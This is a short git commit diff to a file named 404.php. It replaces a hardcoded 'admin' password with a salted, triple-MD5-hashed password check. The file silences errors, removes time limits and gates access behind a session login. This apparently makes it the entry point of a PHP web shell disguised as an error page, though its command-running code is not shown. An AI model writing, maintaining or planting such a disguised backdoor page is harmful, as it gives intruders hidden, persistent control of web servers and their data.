a0672787bfafed239a05d2c75ea81fd2cc3ae9d5
ZayPaiHtet <67455331+zaypaihtet@users.noreply.github.com>
2022-12-01 22:54:54 +0630

    Update 404.php

--- 404.php
+++ 404.php
@@ -2,9 +2,12 @@
 @session_start();
 @set_time_limit(0); 
 @error_reporting(0);
-$pass = "admin";
+$salt = "silic1234";
+$psw = trim($_POST['pass']);
+$pass = $salt.$psw;
+$pass = md5(md5(md5($pass)));
 $chk_login = 1;
-$password = "admin";
+$password = "8f841a9b44b0167db6056389e0106af4";
 if($pass == $password)
 {
 $_SESSION['ses'] = "$pass";
